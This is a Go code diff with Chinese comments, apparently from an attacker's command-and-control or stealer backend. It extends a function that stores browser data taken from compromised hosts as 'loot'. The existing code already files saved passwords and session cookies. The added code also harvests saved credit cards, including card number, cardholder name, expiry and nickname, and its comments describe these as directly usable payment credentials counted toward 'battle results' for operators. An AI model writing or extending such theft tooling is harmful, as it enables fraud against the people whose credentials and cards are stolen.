@@ -17,7 +17,7 @@ import (
 //
 // 返回值是口令入库条数，Cookie 条数单独返回供任务结果展示（Cookie 量大，
 // 不进"凭据"计数以免高估战果）。
-func ingestBrowserArtifact(uid string, art cred.BrowserArtifact) (creds, cookies int) {
+func ingestBrowserArtifact(uid string, art cred.BrowserArtifact) (creds, cookies, cards int) {
 	for _, b := range art.Browsers {
 		name := strings.ToLower(strings.TrimSpace(b.Name))
 		if name == "" {
@@ -33,6 +33,22 @@ func ingestBrowserArtifact(uid string, art cred.BrowserArtifact) (creds, cookies
 			note := fmt.Sprintf("浏览器保存的登录口令；来源 %s/%s；登录地址 %s", name, profile, c.URL)
 			AddLootIfNotEmpty(uid, "pwd", c.User, realm, art.Host, c.Pass, note, "browser:"+name)
 			creds++
+		}
+
+		// 信用卡进库（type=card）：卡号是可直接使用的支付凭据，与口令同级；
+		// 自动填充**不入库** —— 一个用户几百条地址碎片，噪声远大于信号，
+		// 留在制品 JSON 里由操作员按需查看。
+		for _, c := range b.Cards {
+			exp := ""
+			if c.ExpMonth > 0 || c.ExpYear > 0 {
+				exp = fmt.Sprintf("；有效期 %02d/%d", c.ExpMonth, c.ExpYear)
+			}
+			note := fmt.Sprintf("浏览器保存的信用卡（%s/%s）%s", name, profile, exp)
+			if c.Nickname != "" {
+				note += "；昵称 " + c.Nickname
+			}
+			AddLootIfNotEmpty(uid, "card", c.Name, "", art.Host, c.Number, note, "browser:card")
+			cards++
 		}
 
 		for _, c := range b.Cookies {
@@ -51,7 +67,7 @@ func ingestBrowserArtifact(uid string, art cred.BrowserArtifact) (creds, cookies
 			cookies++
 		}
 	}
-	return creds, cookies
+	return creds, cookies, cards
 }
 
 // browserArtifactNote 制品本体入库时的备注：告诉操作员这份 JSON 里有什么、
